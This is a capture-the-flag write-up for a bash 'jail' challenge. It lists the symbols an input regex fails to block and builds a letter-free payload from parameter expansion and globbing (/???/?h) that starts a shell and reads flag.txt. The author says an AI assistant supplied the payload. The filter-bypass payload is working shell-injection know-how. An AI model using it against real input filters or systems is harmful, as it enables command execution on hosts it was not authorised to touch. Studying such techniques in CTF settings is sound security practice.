# nashjail

**CTF:** Tracebash CTF

**Category:** misc

**Difficulty:** 

**Tags:**

**Author:**

**Date:** June 2026

## Analysis
Asked AI what characters are outside the regex:
```
Whitespace: Standard spaces, tabs (\t), and line breaks/newlines (\n).
Dash / Hyphen (-)
Underscore (_)
Plus sign (+)
Equals sign (=)
Question mark (?)
Dollar sign ($)
Hash / Pound (#)
Colon (:) and Semicolon (;)
Comma (,)
Caret (^)
Tilde (~)
Backslash (\)
All brackets other than parentheses: Square brackets ([ and ]) and curly braces ({ and }).
Non-English/Unicode Characters: Accented letters (like é, ü, ñ) or emojis
```
The important allowed ones are `_` *(variable name)* `=` *(assignment)*, `${}` *(evaluation)*, `#` *(length)*, `:` *(no-op)*, `;` *(optional chaining)*, etc related to bash features.

The rest is just experimenting with bash features and intuitions:
- `${#variable}` counts length of strings
- `$?` = exit code of last executed command


## Solution
RCE into shell (from Gemini):
```bash
__=$?;___=${#__};____=~;_____=${____:__:___};______=${-:__:___};$_____???$_____?$______
```
```bash
__=$? assigns 0 (since the regex failure returns 0).
___=${#__} gets the length of "0" (which is 1).
____=~ expands to your home directory (/home/Shinobi).
_____=${____:__:___} slices the home directory starting at index 0 for length 1. Result: /
______=${-:__:___} slices the current shell options ($-, which is usually hB) starting at index 0 for length 1. Result: h
$_____???$_____?$______ evaluates to /???/?h, matching /bin/sh.
```

Could also add `:;` (no-op) at the beginning to ensure `$? = 0` but optional since most recent command is `if [[ "$input" =~ [a-zA-Z0-9/!\&\"\'%().*\<\>@] ]]; then` whose exit code is `0` (stored in `$?`)

Finally with shell just `/bin/cat flag.txt`
<!-- ## Mitigation -->
<!-- Include if the challenge reflects a real-world vulnerability worth noting. -->

## Conclusion

Flag: i forgor